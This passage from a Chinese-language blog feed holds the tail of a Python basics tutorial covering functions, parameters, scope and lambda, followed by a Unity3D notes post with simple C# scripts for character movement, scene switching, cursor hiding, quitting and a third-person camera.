变量对应的值不可以被修改，如果修改，就会生成一个新的值，从而分配新的内存空间！</span></span><br><span class="line"><span class="comment"># 相当于重新定义！重新开辟内存空间！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=10</span></span><br><span class="line"><span class="string">print(id(s))</span></span><br><span class="line"><span class="string">s=15</span></span><br><span class="line"><span class="string">print(id(s))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 内存地址改变了！！！</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 【函数】</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结构：</span></span><br><span class="line"><span class="string">def 函数名():</span></span><br><span class="line"><span class="string">    函数体</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">调用函数：</span></span><br><span class="line"><span class="string"> 函数名()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def login():</span></span><br><span class="line"><span class="string">    print(&quot;这是一个函数&quot;)</span></span><br><span class="line"><span class="string">login()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 注意，调用前必须确定函数已经存在！</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def x_and_y(x,y):</span></span><br><span class="line"><span class="string">    return x+y</span></span><br><span class="line"><span class="string">print(x_and_y(1,2))  # 输出3！</span></span><br><span class="line"><span class="string"># return 如果返回多个值，则会以元组的形式返回给调用者！</span></span><br><span class="line"><span class="string">def hello():</span></span><br><span class="line"><span class="string">    return &quot;hello&quot;,112233</span></span><br><span class="line"><span class="string">print(hello())  # (&#x27;hello&#x27;, 112233)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数的参数</span></span><br><span class="line"><span class="comment"># 1.必备参数（位置参数）</span></span><br><span class="line"><span class="comment"># 含义：传递和定义参数的顺序及个数必须一致</span></span><br><span class="line"><span class="comment"># def func(a,b)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def fun(num1,num2,num3):</span></span><br><span class="line"><span class="string">    print(num1)</span></span><br><span class="line"><span class="string">    print(num2)</span></span><br><span class="line"><span class="string">    print(num3)</span></span><br><span class="line"><span class="string">fun(1,2,3)</span></span><br><span class="line"><span class="string">fun(&#x27;bbbb&#x27;,&#x27;eeee&#x27;,&#x27;tttt&#x27;)</span></span><br><span class="line"><span class="string"># 写几个传几个，不可以多传或少传</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 2.默认参数（缺省参数）</span></span><br><span class="line"><span class="comment"># 含义：为参数提供默认值，调用函数时可以不传该默认参数的值</span></span><br><span class="line"><span class="comment"># 设置默认值没有传值会根据默认值来执行代码，传了值根据传入的值来执行代码</span></span><br><span class="line"><span class="comment"># 格式： def func(a=12)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def func(a=18):</span></span><br><span class="line"><span class="string">    print(a)</span></span><br><span class="line"><span class="string">func()  # 18</span></span><br><span class="line"><span class="string">func(200)   # 200</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：所有的位置参数必须出现在默认参数前，包括函数定义和调用</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def func(a=8,b):</span></span><br><span class="line"><span class="string">    print(a)</span></span><br><span class="line"><span class="string">func()</span></span><br><span class="line"><span class="string">func(200)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">会报错！！！</span></span><br><span class="line"><span class="string">正确写法：</span></span><br><span class="line"><span class="string">def func(b,a=8):</span></span><br><span class="line"><span class="string">    print(a)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 3.可变参数</span></span><br><span class="line"><span class="comment"># 含义：传入的值的数量可以改变，可以传入多个，也可以不传</span></span><br><span class="line"><span class="comment"># def func(*args)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def func(*args):# 可以将args改为其他的变量名，但args更符合规范</span></span><br><span class="line"><span class="string">    print(args)</span></span><br><span class="line"><span class="string">func(1,2,3,4,5)     # (1, 2, 3, 4, 5)   以元组形式接收</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.关键字参数</span></span><br><span class="line"><span class="comment"># 格式： def func(**kwargs)        以字典形式接收</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def fund(**kwargs):</span></span><br><span class="line"><span class="string">    print(kwargs)</span></span><br><span class="line"><span class="string">fund(name=&#x27;haha&#x27;,age=&#x27;18&#x27;)</span></span><br><span class="line"><span class="string"># 作用：可以扩展函数的功能</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 【函数嵌套】</span></span><br><span class="line"><span class="comment"># 1.嵌套调用：在一个函数里面调用另外一个函数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def study():</span></span><br><span class="line"><span class="string">    print(&quot;我在学习&quot;)</span></span><br><span class="line"><span class="string">def course():</span></span><br><span class="line"><span class="string">    study()</span></span><br><span class="line"><span class="string">    print(&quot;学习python&quot;)</span></span><br><span class="line"><span class="string">course()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.嵌套定义：在一个函数里面定义另外一个函数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def study():    # 外函数</span></span><br><span class="line"><span class="string">    print(&quot;我在学习&quot;)</span></span><br><span class="line"><span class="string">    def course():   # 内函数</span></span><br><span class="line"><span class="string">        print(&quot;python基础&quot;)</span></span><br><span class="line"><span class="string">    course()    # 定义和调用是同级的！注意缩进！！！ 调用如果在定义里面，则永远调用不出来！</span></span><br><span class="line"><span class="string">study()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 注意！ 不要在内层函数中调用外层函数，会陷入死循环，直到超过递归的最大深度！</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 【作用域】——变量生效的范围，分为全局变量和局部变量</span></span><br><span class="line"><span class="comment"># 1.全局变量：函数外部定义的变量，在整个文件中都是有效的！</span></span><br><span class="line"><span class="comment"># 2.局部变量：函数内部定义的变量，从定义位置开始到函数定义结束有效！</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在函数内部修改全局变量的值：可以使用global关键字</span></span><br><span class="line"><span class="comment"># 格式：global 变量名</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a=100</span></span><br><span class="line"><span class="string">def aa():</span></span><br><span class="line"><span class="string">    print(a)</span></span><br><span class="line"><span class="string">def bb():</span></span><br><span class="line"><span class="string">    a=200</span></span><br><span class="line"><span class="string">    print(a)</span></span><br><span class="line"><span class="string">def cc():</span></span><br><span class="line"><span class="string">    global a    # 声明全局变量</span></span><br><span class="line"><span class="string">    a=300</span></span><br><span class="line"><span class="string">aa()    # 100</span></span><br><span class="line"><span class="string">bb()    # 200</span></span><br><span class="line"><span class="string">cc()</span></span><br><span class="line"><span class="string">aa()    # 300</span></span><br><span class="line"><span class="string">bb()    # 200</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  nonlocal关键字： 用来声明外层局部变量</span></span><br><span class="line"><span class="comment"># 只能在嵌套函数中使用，在外部函数先进行声明，内部函数进行nonlocal声明</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a=10    # 全局变量</span></span><br><span class="line"><span class="string">def outer():    # 外函数</span></span><br><span class="line"><span class="string">    a=5         # 局部变量</span></span><br><span class="line"><span class="string">    def inner():# 内函数</span></span><br><span class="line"><span class="string">        nonlocal a  # nonlocal 会对外层进行修改！</span></span><br><span class="line"><span class="string">        a=20</span></span><br><span class="line"><span class="string">        print(&quot;inner函数中a的值：&quot;,a)</span></span><br><span class="line"><span class="string">    inner()</span></span><br><span class="line"><span class="string">    print(&quot;outer函数中a的值：&quot;,a)</span></span><br><span class="line"><span class="string">outer()</span></span><br><span class="line"><span class="string"># inner函数中a的值： 20</span></span><br><span class="line"><span class="string"># outer函数中a的值： 20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 【匿名函数】</span></span><br><span class="line"><span class="comment"># 语法：函数名=lambda 形参 : 返回值(表达式)</span></span><br><span class="line"><span class="comment"># 调用：结果=函数名(实参)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add = lambda a,b : a+b # a,b就是匿名函数的形参，a+b就是返回值的表达式，lambda不需要写return,表达式本身就是返回值</span></span><br><span class="line"><span class="string">print(add(1,2)) # 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># lambda 的参数形式：</span></span><br><span class="line"><span class="string"># 1.无参数：</span></span><br><span class="line"><span class="string">funa = lambda : &quot;bingbingbangbang&quot;</span></span><br><span class="line"><span class="string">print(funa())   # bingbingbangbang</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.必备参数：</span></span><br><span class="line"><span class="string">func = lambda name : name</span></span><br><span class="line"><span class="string">print(func(&quot;bingbing&quot;))     # bingbing</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 3.默认参数：</span></span><br><span class="line"><span class="string">fund =lambda name,age=18 : (name,age) # 返回值以元组形式！</span></span><br><span class="line"><span class="string">print(fund(&#x27;bb&#x27;))   # (&#x27;bb&#x27;, 18)</span></span><br><span class="line"><span class="string"># 默认参数必须写在非默认参数后面！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4.可变参数/关键字参数：</span></span><br><span class="line"><span class="string">funn = lambda **kwargs : kwargs</span></span><br><span class="line"><span class="string">print(funn(name=&#x27;bbb&#x27;,age=18))  # &#123;&#x27;name&#x27;: &#x27;bbb&#x27;, &#x27;age&#x27;: 18&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 【lambda】结合 if 判断</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 三目运算</span></span><br><span class="line"><span class="string">a=5</span></span><br><span class="line"><span class="string">b=8</span></span><br><span class="line"><span class="string">print(&#x27;a小于b&#x27;) if a&lt;b else print(&#x27;a大于b&#x27;) # a小于b</span></span><br><span class="line"><span class="string"># 结合lambda</span></span><br><span class="line"><span class="string">comp = lambda a,b : &quot;a比b小&quot; if a&lt;b else print(&#x27;a大于b&#x27;)</span></span><br><span class="line"><span class="string">print(comp(5,7))    # a比b小</span></span><br><span class="line"><span class="string"># 特点：lambda只能实现简单的逻辑，如果逻辑复杂且代码量较大，不建议使用lambda，降低代码的可读性</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 【内置函数】</span></span><br><span class="line"><span class="comment"># 查看所有的内置函数</span></span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(builtins))</span><br><span class="line"><span class="comment"># 大写字母开头的一般是内置常量名，小写字母开头一般是内置函数名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 【拆包】</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unity3D游戏开发笔记（一）</title>
      <link href="/2025/02/10/unity3D%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/10/unity3D%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="关于-ClianWorld-测试版使用脚本记录（一）"><a href="#关于-ClianWorld-测试版使用脚本记录（一）" class="headerlink" title="关于 ClianWorld 测试版使用脚本记录（一） :"></a>关于 ClianWorld 测试版使用脚本记录（一） :</h2><p><img src="https://pic1.imgdb.cn/item/67a9ad29d0e0a243d4fde3cb.png" style="zoom:5%;" /></p><h3 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h3><p>C联致力于开发的开放世界虚拟基地，基于unity游戏引擎，按照《次元永生》界海世界观进行打造。</p><p>同时，我们将继续进行游戏性的开发，探索更多的游戏模式以及可玩性，最终打造划时代的产品。</p><h3 id="记录："><a href="#记录：" class="headerlink" title="记录："></a>记录：</h3><h4 id="1-基于Character-Contorller的角色移动脚本（基础版）"><a href="#1-基于Character-Contorller的角色移动脚本（基础版）" class="headerlink" title="1.基于Character Contorller的角色移动脚本（基础版）"></a>1.基于Character Contorller的角色移动脚本（基础版）</h4><p>功能：实现游戏角色的前后移动和方向旋转</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PlayerMovement</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> CharacterController controller;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> Speed = <span class="number">10f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> RotateSpeed = <span class="number">1f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> Gravity = <span class="number">-9.8f</span>;</span><br><span class="line">    <span class="keyword">private</span> Vector3 Velocity = Vector3.zero;</span><br><span class="line">    <span class="keyword">public</span> Transform GroundCheck;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> CheckRadius = <span class="number">0.2f</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">bool</span> IsGround;</span><br><span class="line">    <span class="keyword">public</span> LayerMask layerMask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> JumpHeight = <span class="number">3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        controller = transform.GetComponent&lt;CharacterController&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        MoveLikeWow();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">MoveLikeWow</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        IsGround = Physics.CheckSphere(GroundCheck.position, CheckRadius, layerMask);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(IsGround &amp;&amp; Velocity.y&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Velocity.y = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> horizontal = Input.GetAxis(<span class="string">&quot;Horizontal&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> vertical = Input.GetAxis(<span class="string">&quot;Vertical&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> move = transform.forward * Speed * vertical * Time.deltaTime;</span><br><span class="line">        controller.Move(move);</span><br><span class="line"></span><br><span class="line">        Velocity.y += Gravity + Time.deltaTime;</span><br><span class="line">        controller.Move(Velocity * Time.deltaTime);</span><br><span class="line"></span><br><span class="line">        transform.Rotate(Vector3.up, horizontal * RotateSpeed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-全局场景跳转脚本（帮助界面为例）"><a href="#2-全局场景跳转脚本（帮助界面为例）" class="headerlink" title="2.全局场景跳转脚本（帮助界面为例）"></a>2.全局场景跳转脚本（帮助界面为例）</h4><p>功能：由一个场景(Scene)跳转到其他场景</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.SceneManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Help</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 菜单界面的场景名称</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> menuSceneName = <span class="string">&quot;help&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 检测是否按下H键</span></span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.H))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载帮助菜单场景</span></span><br><span class="line">            SceneManager.LoadScene(<span class="string">&quot;help&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-绑定按钮场景跳转脚本（开始菜单为例）"><a href="#3-绑定按钮场景跳转脚本（开始菜单为例）" class="headerlink" title="3.绑定按钮场景跳转脚本（开始菜单为例）"></a>3.绑定按钮场景跳转脚本（开始菜单为例）</h4><p>功能：通过绑定到按钮上，实现场景跳转</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.SceneManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FirstWorld</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadGame</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        SceneManager.LoadScene(<span class="string">&quot;firstworld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-隐藏鼠标"><a href="#4-隐藏鼠标" class="headerlink" title="4.隐藏鼠标"></a>4.隐藏鼠标</h4><p>(修改参数可以控制鼠标指针是否显示)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">killmouse</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Cursor.visible = <span class="literal">false</span>; <span class="comment">// 隐藏鼠标</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-退出游戏（EXIT）"><a href="#5-退出游戏（EXIT）" class="headerlink" title="5.退出游戏（EXIT）"></a>5.退出游戏（EXIT）</h4><p>功能：绑定按钮，实现点击退出游戏</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ExitGameButton</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnExitButtonClick</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用Application类的方法来退出游戏</span></span><br><span class="line">        Application.Quit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-第三人称自由视角-镜头"><a href="#6-第三人称自由视角-镜头" class="headerlink" title="6.第三人称自由视角(镜头)"></a>6.第三人称自由视角(镜头)</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.InputSystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ThirdPersonCamera</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> GameObject _mainCamera;</span><br><span class="line">    [<span class="meta">Header(<span class="string">&quot;Cinemachine&quot;</span>)</span>]</span><br><span class="line">    [<span class="meta">Tooltip(<span class="string">&quot;跟随的目标&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> GameObject CameraTarget;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Tooltip(<span class="string">&quot;上移动的最大角度&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> TopClamp = <span class="number">70.0f</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Tooltip(<span class="string">&quot;下移动的最大角度&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> BottomClamp = <span class="number">-30.0f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">float</span> _threshold = <span class="number">0.01f</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetYaw;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetPitch;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_mainCamera == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            _mainCamera = GameObject.FindGameObjectWithTag(<span class="string">&quot;MainCamera&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        _cinemachineTargetYaw = CameraTarget.transform.rotation.eulerAngles.y;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_look.sqrMagnitude &gt;= _threshold)</span><br><span class="line">        &#123;</span><br><span class="line">            _cinemachineTargetYaw += _look.x;</span><br><span class="line">            _cinemachineTargetPitch -= _look.y;</span><br><span class="line">        &#125;</span><br><span class="line">        _cinemachineTargetYaw = ClampAngle(_cinemachineTargetYaw, <span class="built_in">float</span>.MinValue, <span class="built_in">float</span>.MaxValue);</span><br><span class="line">        _cinemachineTargetPitch = ClampAngle(_cinemachineTargetPitch, BottomClamp, TopClamp);</span><br><span class="line">        CameraTarget.transform.rotation = Quaternion.Euler(_cinemachineTargetPitch, _cinemachineTargetYaw, <span class="number">0.0f</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">float</span> <span class="title">ClampAngle</span>(<span class="params"><span class="built_in">float</span> lfAngle, <span class="built_in">float</span> lfMin, <span class="built_in">float</span> lfMax</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (lfAngle &lt; <span class="number">-360f</span>) lfAngle += <span class="number">360f</span>;</span><br><span class="line">        <span class="keyword">if</span> (lfAngle &gt; <span class="number">360f</span>) lfAngle -= <span class="number">360f</span>;</span><br><span class="line">        <span class="keyword">return</span> Mathf.Clamp(lfAngle, lfMin, lfMax);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Vector2 _look;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnLook</span>(<span class="params">InputValue <span class="keyword">value</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _look = <span class="keyword">value</span>.Get&lt;Vector2&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> unity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unity </tag>
            
